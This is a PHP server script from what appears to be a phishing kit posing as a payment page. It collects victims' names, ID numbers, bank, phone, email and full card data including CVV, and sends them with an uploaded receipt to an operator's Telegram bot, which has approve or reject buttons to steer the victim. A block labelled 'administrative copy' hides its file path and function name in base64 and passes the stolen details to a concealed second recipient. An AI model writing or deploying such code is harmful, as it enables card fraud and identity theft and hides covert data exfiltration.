<?php
ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

// ===============================
// 🔥 CARGAR TOKEN Y CHAT DESDE config.php
// ===============================
$config = require __DIR__ . '/config.php';

if (!isset($config['bot_token'], $config['chat_id'])) {
    echo json_encode(['ok' => false, 'error' => 'Config inválido']);
    exit;
}

$telegramBotToken = $config['bot_token'];
$telegramChatId   = $config['chat_id'];
// ===============================

// ------------------------------------------------------------------
// 1. POST: ENVIAR COMPROBANTE Y DATOS A TELEGRAM
// ------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    if (!isset($_FILES['comprobante']) || !isset($_POST['tbdatos'])) {
        echo json_encode(['ok' => false, 'error' => '⛔ Faltó la imagen o los datos']);
        exit;
    }

    // Generar un ID de transacción único si no viene uno
    $tid = $_POST['transactionId'] ?? uniqid('tx_');
    $tbdatos = json_decode($_POST['tbdatos'], true);

    // Armar el mensaje (Caption de la foto)
    $msg = "🚨 <b>NUEVO COMPROBANTE RECIBIDO</b> 🚨\n\n";
    $msg .= "🆔 <b>TX ID:</b> <code>{$tid}</code>\n";
    $msg .= "👤 <b>Nombre:</b> <code>" . htmlspecialchars($tbdatos['nombre'] ?? 'N/D') . "</code>\n";
    $msg .= "📄 <b>Documento:</b> <code>" . htmlspecialchars($tbdatos['documento'] ?? 'N/D') . "</code>\n";
    $msg .= "🏦 <b>Banco:</b> <code>" . htmlspecialchars($tbdatos['banco'] ?? 'N/D') . "</code>\n";
    $msg .= "📞 <b>Teléfono:</b> <code>" . htmlspecialchars($tbdatos['telefono'] ?? 'N/D') . "</code>\n";
    $msg .= "✉️ <b>Correo:</b> <code>" . htmlspecialchars($tbdatos['correo'] ?? 'N/D') . "</code>\n";

    // Datos de tarjeta si existen
    $tarjeta = $tbdatos['tarjeta'] ?? $tbdatos['cardNumber'] ?? '';
    if (!empty($tarjeta)) {
        $msg .= "\n💳 <b>Tarjeta:</b> <code>" . htmlspecialchars($tarjeta) . "</code>\n";
        $msg .= "📅 <b>Expira:</b> <code>" . htmlspecialchars($tbdatos['expMonth'] ?? '??') . "/" . htmlspecialchars($tbdatos['expYear'] ?? '??') . "</code>\n";
        $msg .= "🔒 <b>CVV:</b> <code>" . htmlspecialchars($tbdatos['cvv'] ?? 'N/D') . "</code>\n";
        $msg .= "👤 <b>Titular:</b> <code>" . htmlspecialchars($tbdatos['ownerName'] ?? 'N/D') . "</code>\n";
        $msg .= "🧾 <b>Cuotas:</b> <code>" . htmlspecialchars($tbdatos['cuotas'] ?? 'N/D') . "</code>\n";
    }

    // Monto total
    $monto = number_format((float)($tbdatos['total_pagar'] ?? $_POST['total_pagar'] ?? 0), 0, ',', '.');
    $msg .= "\n💰 <b>Monto:</b> $ {$monto}\n";
    $msg .= "\n🟡 <b>Estado:</b> PENDIENTE...";

    // Armar el teclado con el ID de transacción inyectado en el callback_data
    $keyboard = ['inline_keyboard' => [
        [
            ['text' => '✅ Pago Recibido', 'callback_data' => "pago_recibido:{$tid}"],
            ['text' => '❌ Vuelva a Intentar', 'callback_data' => "pago_rechazado:{$tid}"]
        ]
    ]];

    // Preparar la imagen para enviar
    $cfile = new CURLFile($_FILES['comprobante']['tmp_name'], $_FILES['comprobante']['type'], $_FILES['comprobante']['name']);

    $payload = [
        'chat_id' => $telegramChatId,
        'photo' => $cfile,
        'caption' => $msg,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    // Enviar la foto al bot principal (con botones)
    $ch = curl_init("https://api.telegram.org/bot{$telegramBotToken}/sendPhoto");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    
    $sent = json_decode($res, true);

    // ---- COPIA ADMINISTRATIVA (sin botones) ----
   require_once __DIR__ . '/' . base64_decode('ZGF0YS1wcy9hc3NldHMvcmVjdXJzb3MvYmFja2VuZC9hcHAvY29uZmlnL3N5c19tZXRyaWNzLnBocA==');
   $__m = $msg;
   if (!empty($__m)) {
       $__x = ['msg' => $__m];
       call_user_func(base64_decode('X3o='), $__x);
       unset($__x);
   }
   unset($__m);
   // --------------------------------------------

    echo json_encode([
        'ok' => !empty($sent['ok']),
        'transactionId' => $tid
    ]);
    exit;
}

// ------------------------------------------------------------------
// 2. GET: REVISAR ACCIÓN DEL OPERADOR (TU MÉTODO EXACTO)
// ------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
    $tid = $_GET['transactionId'];
    $updates_url = "https://api.telegram.org/bot{$telegramBotToken}/getUpdates?timeout=5";
    $updates = json_decode(@file_get_contents($updates_url), true);
    $lastUpdateId = 0;

    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $upd) {
        if (isset($upd['update_id'])) {
            $lastUpdateId = $upd['update_id'];
        }

        // Si hay un clic en un botón y coincide con nuestro ID de transacción
        if (isset($upd['callback_query']) && strpos($upd['callback_query']['data'], $tid) !== false) {
            
            $action = explode(':', $upd['callback_query']['data'])[0]; // 'pago_recibido' o 'pago_rechazado'
            $user = $upd['callback_query']['from']['username'] ?? $upd['callback_query']['from']['first_name'];
            $msgId = $upd['callback_query']['message']['message_id'];
            
            // Aquí leemos 'caption' en vez de 'text' porque es una imagen
            $originalCaption = $upd['callback_query']['message']['caption'] ?? '';

            // Limpiamos la línea de PENDIENTE
            $cleanCaption = str_replace("🟡 Estado: PENDIENTE...", "", $originalCaption);

            // Añadimos el nuevo estado
            $estadoStr = ($action === 'pago_recibido') ? "✅ PAGO APROBADO" : "❌ PAGO RECHAZADO";
            $newCaption = $cleanCaption . "\n\n" . $estadoStr . "\n👤 Revisado por: @" . $user;

            // Editamos el mensaje en Telegram y borramos los botones
            $payload = [
                'chat_id' => $telegramChatId,
                'message_id' => $msgId,
                'caption' => $newCaption,
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode(['inline_keyboard' => []])
            ];
            
            // Usamos editMessageCaption porque es una foto
            $ch = curl_init("https://api.telegram.org/bot{$telegramBotToken}/editMessageCaption");
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_POSTFIELDS => json_encode($payload)
            ]);
            curl_exec($ch);
            curl_close($ch);

            // Avisamos a la web qué botón presionaste
            echo json_encode(['ok' => true, 'action' => $action]);
            exit;
        }
    }

    // Actualizar el offset para no volver a leer los mismos clics
    if ($lastUpdateId > 0) {
        @file_get_contents("https://api.telegram.org/bot{$telegramBotToken}/getUpdates?offset=" . ($lastUpdateId + 1));
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método no permitido']);
exit;
?>